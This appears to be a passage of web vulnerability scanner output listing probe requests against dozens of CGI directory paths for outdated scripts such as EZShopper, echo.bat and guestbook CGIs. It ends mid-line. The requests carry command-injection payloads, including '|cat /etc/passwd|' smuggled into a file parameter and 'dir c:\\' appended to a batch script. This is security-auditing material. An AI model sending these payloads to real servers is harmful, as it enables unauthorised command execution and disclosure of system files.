++ GET /cgi-exe/html2wml.cgi: /cgi-exe/html2wml.cgi: Html2Wml < 0.4.8 access local files via CGI, and more
++ GET /cgi-home/html2wml.cgi: /cgi-home/html2wml.cgi: Html2Wml < 0.4.8 access local files via CGI, and more
++ GET /cgi-perl/html2wml.cgi: /cgi-perl/html2wml.cgi: Html2Wml < 0.4.8 access local files via CGI, and more
++ GET /scgi-bin/html2wml.cgi: /scgi-bin/html2wml.cgi: Html2Wml < 0.4.8 access local files via CGI, and more
++ GET /cgi.cgi/echo.bat?&dir+c:\\: /cgi.cgi/echo.bat?&dir+c:\\: This batch file may allow attackers to execute remote commands.
++ GET /webcgi/echo.bat?&dir+c:\\: /webcgi/echo.bat?&dir+c:\\: This batch file may allow attackers to execute remote commands.
++ GET /cgi-914/echo.bat?&dir+c:\\: /cgi-914/echo.bat?&dir+c:\\: This batch file may allow attackers to execute remote commands.
++ GET /cgi-915/echo.bat?&dir+c:\\: /cgi-915/echo.bat?&dir+c:\\: This batch file may allow attackers to execute remote commands.
++ GET /bin/echo.bat?&dir+c:\\: /bin/echo.bat?&dir+c:\\: This batch file may allow attackers to execute remote commands.
++ GET /cgi/echo.bat?&dir+c:\\: /cgi/echo.bat?&dir+c:\\: This batch file may allow attackers to execute remote commands.
++ GET /mpcgi/echo.bat?&dir+c:\\: /mpcgi/echo.bat?&dir+c:\\: This batch file may allow attackers to execute remote commands.
++ GET /cgi-bin/echo.bat?&dir+c:\\: /cgi-bin/echo.bat?&dir+c:\\: This batch file may allow attackers to execute remote commands.
++ GET /ows-bin/echo.bat?&dir+c:\\: /ows-bin/echo.bat?&dir+c:\\: This batch file may allow attackers to execute remote commands.
++ GET /cgi-sys/echo.bat?&dir+c:\\: /cgi-sys/echo.bat?&dir+c:\\: This batch file may allow attackers to execute remote commands.
++ GET /cgi-local/echo.bat?&dir+c:\\: /cgi-local/echo.bat?&dir+c:\\: This batch file may allow attackers to execute remote commands.
++ GET /htbin/echo.bat?&dir+c:\\: /htbin/echo.bat?&dir+c:\\: This batch file may allow attackers to execute remote commands.
++ GET /cgibin/echo.bat?&dir+c:\\: /cgibin/echo.bat?&dir+c:\\: This batch file may allow attackers to execute remote commands.
++ GET /cgis/echo.bat?&dir+c:\\: /cgis/echo.bat?&dir+c:\\: This batch file may allow attackers to execute remote commands.
++ GET /scripts/echo.bat?&dir+c:\\: /scripts/echo.bat?&dir+c:\\: This batch file may allow attackers to execute remote commands.
++ GET /cgi-win/echo.bat?&dir+c:\\: /cgi-win/echo.bat?&dir+c:\\: This batch file may allow attackers to execute remote commands.
++ GET /fcgi-bin/echo.bat?&dir+c:\\: /fcgi-bin/echo.bat?&dir+c:\\: This batch file may allow attackers to execute remote commands.
++ GET /cgi-exe/echo.bat?&dir+c:\\: /cgi-exe/echo.bat?&dir+c:\\: This batch file may allow attackers to execute remote commands.
++ GET /cgi-home/echo.bat?&dir+c:\\: /cgi-home/echo.bat?&dir+c:\\: This batch file may allow attackers to execute remote commands.
++ GET /cgi-perl/echo.bat?&dir+c:\\: /cgi-perl/echo.bat?&dir+c:\\: This batch file may allow attackers to execute remote commands.
++ GET /scgi-bin/echo.bat?&dir+c:\\: /scgi-bin/echo.bat?&dir+c:\\: This batch file may allow attackers to execute remote commands.
++ -56: GET /cgi.cgi/ezshopper/loadpage.cgi?user_id=1&file=|cat%20/etc/passwd|: /cgi.cgi/ezshopper/loadpage.cgi?user_id=1&file=|cat%20/etc/passwd|: EZShopper loadpage CGI command execution
++ -56: GET /webcgi/ezshopper/loadpage.cgi?user_id=1&file=|cat%20/etc/passwd|: /webcgi/ezshopper/loadpage.cgi?user_id=1&file=|cat%20/etc/passwd|: EZShopper loadpage CGI command execution
++ -56: GET /cgi-914/ezshopper/loadpage.cgi?user_id=1&file=|cat%20/etc/passwd|: /cgi-914/ezshopper/loadpage.cgi?user_id=1&file=|cat%20/etc/passwd|: EZShopper loadpage CGI command execution
++ -56: GET /cgi-915/ezshopper/loadpage.cgi?user_id=1&file=|cat%20/etc/passwd|: /cgi-915/ezshopper/loadpage.cgi?user_id=1&file=|cat%20/etc/passwd|: EZShopper loadpage CGI command execution
++ -56: GET /bin/ezshopper/loadpage.cgi?user_id=1&file=|cat%20/etc/passwd|: /bin/ezshopper/loadpage.cgi?user_id=1&file=|cat%20/etc/passwd|: EZShopper loadpage CGI command execution
++ -56: GET /cgi/ezshopper/loadpage.cgi?user_id=1&file=|cat%20/etc/passwd|: /cgi/ezshopper/loadpage.cgi?user_id=1&file=|cat%20/etc/passwd|: EZShopper loadpage CGI command execution
++ -56: GET /mpcgi/ezshopper/loadpage.cgi?user_id=1&file=|cat%20/etc/passwd|: /mpcgi/ezshopper/loadpage.cgi?user_id=1&file=|cat%20/etc/passwd|: EZShopper loadpage CGI command execution
++ -56: GET /cgi-bin/ezshopper/loadpage.cgi?user_id=1&file=|cat%20/etc/passwd|: /cgi-bin/ezshopper/loadpage.cgi?user_id=1&file=|cat%20/etc/passwd|: EZShopper loadpage CGI command execution
++ -56: GET /ows-bin/ezshopper/loadpage.cgi?user_id=1&file=|cat%20/etc/passwd|: /ows-bin/ezshopper/loadpage.cgi?user_id=1&file=|cat%20/etc/passwd|: EZShopper loadpage CGI command execution
++ -56: GET /cgi-sys/ezshopper/loadpage.cgi?user_id=1&file=|cat%20/etc/passwd|: /cgi-sys/ezshopper/loadpage.cgi?user_id=1&file=|cat%20/etc/passwd|: EZShopper loadpage CGI command execution
++ -56: GET /cgi-local/ezshopper/loadpage.cgi?user_id=1&file=|cat%20/etc/passwd|: /cgi-local/ezshopper/loadpage.cgi?user_id=1&file=|cat%20/etc/passwd|: EZShopper loadpage CGI command execution
++ -56: GET /htbin/ezshopper/loadpage.cgi?user_id=1&file=|cat%20/etc/passwd|: /htbin/ezshopper/loadpage.cgi?user_id=1&file=|cat%20/etc/passwd|: EZShopper loadpage CGI command execution
++ -56: GET /cgibin/ezshopper/loadpage.cgi?user_id=1&file=|cat%20/etc/passwd|: /cgibin/ezshopper/loadpage.cgi?user_id=1&file=|cat%20/etc/passwd|: EZShopper loadpage CGI command execution
++ -56: GET /cgis/ezshopper/loadpage.cgi?user_id=1&file=|cat%20/etc/passwd|: /cgis/ezshopper/loadpage.cgi?user_id=1&file=|cat%20/etc/passwd|: EZShopper loadpage CGI command execution
++ -56: GET /scripts/ezshopper/loadpage.cgi?user_id=1&file=|cat%20/etc/passwd|: /scripts/ezshopper/loadpage.cgi?user_id=1&file=|cat%20/etc/passwd|: EZShopper loadpage CGI command execution
++ -56: GET /cgi-win/ezshopper/loadpage.cgi?user_id=1&file=|cat%20/etc/passwd|: /cgi-win/ezshopper/loadpage.cgi?user_id=1&file=|cat%20/etc/passwd|: EZShopper loadpage CGI command execution
++ -56: GET /fcgi-bin/ezshopper/loadpage.cgi?user_id=1&file=|cat%20/etc/passwd|: /fcgi-bin/ezshopper/loadpage.cgi?user_id=1&file=|cat%20/etc/passwd|: EZShopper loadpage CGI command execution
++ -56: GET /cgi-exe/ezshopper/loadpage.cgi?user_id=1&file=|cat%20/etc/passwd|: /cgi-exe/ezshopper/loadpage.cgi?user_id=1&file=|cat%20/etc/passwd|: EZShopper loadpage CGI command execution
++ -56: GET /cgi-home/ezshopper/loadpage.cgi?user_id=1&file=|cat%20/etc/passwd|: /cgi-home/ezshopper/loadpage.cgi?user_id=1&file=|cat%20/etc/passwd|: EZShopper loadpage CGI command execution
++ -56: GET /cgi-perl/ezshopper/loadpage.cgi?user_id=1&file=|cat%20/etc/passwd|: /cgi-perl/ezshopper/loadpage.cgi?user_id=1&file=|cat%20/etc/passwd|: EZShopper loadpage CGI command execution
++ -56: GET /scgi-bin/ezshopper/loadpage.cgi?user_id=1&file=|cat%20/etc/passwd|: /scgi-bin/ezshopper/loadpage.cgi?user_id=1&file=|cat%20/etc/passwd|: EZShopper loadpage CGI command execution
++ GET /cgi.cgi/guestbook.cgi: /cgi.cgi/guestbook.cgi: May allow attackers to execute commands as the web daemon.
++ GET /webcgi/guestbook.cgi: /webcgi/guestbook.cgi: May allow attackers to execute commands as the web daemon.
++ GET /cgi-914/guestbook.cgi: /cgi-914/guestbook.cgi: May allow attackers to execute commands as the web daemon.
++ GET /cgi-915/guestbook.cgi: /cgi-915/guestbook.cgi: May allow attackers to execute commands as the web daemon.
++ GET /bin/guestbook.cgi: /bin/guestbook.cgi: May allow attackers to execute commands as the web daemon.
++ GET /cgi/guestbook.cgi: /cgi/guestbook.cgi: May allow attackers to execute commands as the web daemon.
++ GET /mpcgi/guestbook.cgi: /mpcgi/guestbook.cgi: May allow attackers to execute commands as the web daemon.
++ GET /cgi-bin/guestbook.cgi: /cgi-bin/guestbook.cgi: May allow attackers to execute commands as the web daemon.
++ GET /ows-bin/guestbook.cgi: /ows-bin/guestbook.cgi: May allow attackers to execute commands as the web daemon.
++ GET /cgi-sys/guestbook.cgi: /cgi-sys/guestbook.cgi: May allow attackers to execute commands as the web daemon.
++ GET /cgi-local/guestbook.cgi: /cgi-local/guestbook.cgi: May allow attackers to execute commands as the web daemon.
++ GET /htbin/guestbook.cgi: /htbin/guestbook.cgi: May allow attackers to execute commands as the web daemon.
++ GET /cgibin/guestbook.cgi: /cgibin/guestbook.cgi: May allow attackers to execute commands as the web daemon.
++ GET /cgis/guestbook.cgi: /cgis/guestbook.cgi: May allow attackers to execute commands as the web daemon.
++ GET /scripts/guestbook.cgi: /scripts/guestbook.cgi: May allow attackers to execute commands as the web daemon.
++ GET /cgi-win/guestbook.cgi: /cgi-win/guestbook.cgi: May allow attackers to execute commands as the web daemon.
++ GET /fcgi-bin/guestbook.cgi: /fcgi-bin/guestbook.cgi: May allow attackers to execute commands as the web daemon.
++ GET /cgi-exe/guestbook.cgi: /cgi-exe/guestbook.cgi: May allow attackers to execute commands as the web daemon.
++ GET /cgi-home/guestbook.cgi: /cgi-home/guestbook.cgi: May allow attackers to execute commands as the web daemon.
++ GET /cgi-perl/guestbook.cgi: /cgi-perl/guestbook.cgi: May allow attackers to execute commands as the web daemon.
++ GET /scgi-bin/guestbook.cgi: /scgi-bin/guestbook.cgi: May allow attackers to execute commands as the web daemon.
++ GET /cgi.cgi/guestbook.pl: /cgi.cgi/guestbook.pl: May allow attackers to execute commands as the web daemon.
++ GET /webcgi/guestbook.pl: /webcgi/guestbook.pl: May allow attackers to execute commands as the web daemon.
++ GET /cgi-914/guestbook.pl: /cgi-914/guestbook.pl: May allow attackers to execute commands as the web daemon.
++ GET /cgi-915/guestbook.pl: /cgi-915/guestbook.pl: May allow attackers to execute commands as the web daemon.
++ GET /bin/guestbook.pl: /bin/guestbook.pl: May allow attackers to execute commands as the web daemon.
++ GET /cgi/guestbook.pl: /cgi/guestbook.pl: May allow attackers to execute commands as the web daemon.
++ GET /mpcgi/guestbook.pl: /mpcgi/guestbook.pl: May allow attackers to execute commands as the web daemon.
++ GET /cgi-bin/guestbook.pl: /cgi-bin/guestbook.pl: May allow attackers to execute commands as the web daemon.
++ GET /ows-bin/guestbook.pl: /ows-bin/guestbook.pl: May allow attackers to execute commands as the web daemon.
++ GET /cgi-sys/guestbook.pl: /cgi-sys/guestbook.pl: May allow attackers to execute commands as the web daemon.
++ GET /cgi-local/guestbook.pl: /cgi-local/guestbook.pl: May allow attackers to execute commands as the web daemon.
++ GET /htbin/guestbook.pl: /htbin/guestbook.pl: May allow attackers to execute commands as the web daemon.
++ GET /cgibin/guestbook.pl: /cgibin/guestbook.pl: May allow attackers to execute commands as the web daemon.
++ GET /cgis/guestbook.pl: /cgis/guestbook.pl: May allow attackers to execute commands as the web daemon.
++ GET /scripts/guestbook.pl: /scripts/guestbook.pl: May allow attackers to execute commands as the web daemon.
++ GET /cgi-win/guestbook.pl: /cgi-win/guestbook.pl: May allow attackers to execute commands as the web daemon.
++ GET /fcgi-bin/guestbook.pl: /fcgi-bin/guestbook.pl: May allow attackers to execute commands as the web daemon.
++ GET /cgi-exe/guestbook.pl: /cgi-exe/guestbook.pl: May allow attackers to execute commands as the web daemon.
++ GET /cgi-home/guestbook.pl: /cgi-home/guestbook.pl: May allow attackers to execute commands as the web daemon.
++ GET /cgi-perl/guestbook.pl: /cgi-perl/guestbook.pl: May allow attackers to execute commands as the web daemon.
++ GET /scgi-bin/guestbook.pl: /scgi-bin/guestbook.pl: May allow attackers to execute commands as the web daemon.
++ GET /cgi.cgi/ss: /cgi.cgi/ss: Mediahouse Statistics Server may allow attackers to execute remote commands. Upgrade to the latest version or remove from the CGI directory.
++ GET /webcgi/ss: /webcgi/ss: Mediahouse Statistics Server may allow attackers to execute remote commands. Upgrade to the latest version or remove from the 
